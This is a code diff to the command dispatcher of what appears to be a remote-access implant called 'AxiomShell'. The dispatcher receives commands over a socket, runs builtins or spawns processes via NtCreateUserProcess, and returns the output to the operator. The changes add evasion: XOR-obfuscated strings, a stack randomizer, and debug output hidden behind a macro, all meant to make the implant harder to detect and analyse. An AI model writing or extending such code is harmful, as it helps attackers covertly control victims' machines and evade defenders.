@@ -1,9 +1,11 @@
 #include <stdio.h>
 #include "AxiomShell.h"
 #include "Glibc.h"
+#include "autoxor.h"
 
 void CORE_handle_command(SOCKET sock, PCOMMAND cmd)
 {
+	STACK_RANDOMIZER;
 	size_t i;
 	char *cmdargs;
 	char *tmpcmdargs;
@@ -22,7 +24,7 @@ void CORE_handle_command(SOCKET sock, PCOMMAND cmd)
 	};
 
 	// Process the command
-	printf("[+] Running dispatcher\n");
+	DEBUG_LOG("[+] Running dispatcher\n");
 	switch (cmd->commandType)
 	{
 		case CommandBuiltin:
@@ -38,8 +40,8 @@ void CORE_handle_command(SOCKET sock, PCOMMAND cmd)
 				i++;
 			}
 			if (builtinDispatcher[i].builtin_name == NULL) {
-				JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Unknown builtin name\n");
-				printf("[!] Unknown builtin name: %s\n", cmd->binary);
+				JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Unknown builtin name\n"));
+				DEBUG_LOG("[!] Unknown builtin name: %s\n", cmd->binary);
 			}
 			break;
 		case CommandCommand:
@@ -49,7 +51,7 @@ void CORE_handle_command(SOCKET sock, PCOMMAND cmd)
 			// Build CLI arguments as a single string (the format expected by NtCreateUserProcess)
 			while (i < cmd->argumentCount)
 			{
-				tmpcmdargs = malloc(strlen(cmdargs) + strlen(cmd->arguments[i]) + strlen(" ") + 1);
+				tmpcmdargs = (char *)malloc(strlen(cmdargs) + strlen(cmd->arguments[i]) + strlen(" ") + 1);
 				drunk_strcpy(tmpcmdargs, cmdargs);
 				drunk_strcat(tmpcmdargs, " ");
 				drunk_strcat(tmpcmdargs, cmd->arguments[i]);
@@ -72,7 +74,7 @@ void CORE_handle_command(SOCKET sock, PCOMMAND cmd)
 			free(output);
 			break;
 		default:
-			JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Unknown command type\n");
+			JSON_send_packets(JsonCommandOutput, sock, (void*)XorStr("[!] Unknown command type\n"));
 			break;
 	}
 }
